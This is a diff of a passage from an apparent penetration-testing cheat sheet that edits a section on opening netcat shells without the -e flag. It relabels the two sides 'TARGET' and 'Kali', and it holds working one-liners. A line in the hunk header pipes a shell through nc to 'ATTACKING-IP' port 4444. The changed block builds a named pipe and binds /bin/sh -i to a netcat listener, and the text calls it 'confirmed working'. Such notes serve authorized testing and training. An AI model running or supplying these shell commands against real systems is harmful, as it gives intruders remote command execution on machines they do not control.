@@ -138,18 +138,17 @@ rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
 **Without -e flag v2 (confirmed working)**
 
 
-On ‘server’ side:
+On TARGET side:
 
 ```
-$ rm -f /tmp/f; mkfifo /tmp/f
-$ cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f
+rm -f /tmp/f; mkfifo /tmp/f
+cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f
 ```
 
- On ‘client’ side:
+ On Kali side:
 
 ```
-$ nc host.example.com 1234
-$ (shell prompt from host.example.com)
+nc host.example.com 1234
 ```
 
 Upgrade Netcat shell to an interactive: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
